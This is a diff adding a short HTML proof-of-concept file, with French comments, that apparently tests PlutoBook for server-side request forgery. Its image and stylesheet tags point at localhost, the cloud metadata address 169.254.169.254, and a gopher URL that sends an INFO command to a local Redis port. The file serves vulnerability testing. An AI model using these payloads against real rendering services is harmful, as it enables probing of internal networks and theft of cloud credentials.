@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>PoC SSRF</title></head>
+<body>
+  <!-- Chaque ressource declenche une requete sortante non filtree -->
+  <img src="http://127.0.0.1:8081/ssrf-probe">
+  <img src="http://169.254.169.254/latest/meta-data/">
+  <link rel="stylesheet" href="gopher://127.0.0.1:6379/_INFO%0d%0a">
+  <p>Si PlutoBook tente ces requetes, la SSRF est confirmee.</p>
+</body></html>
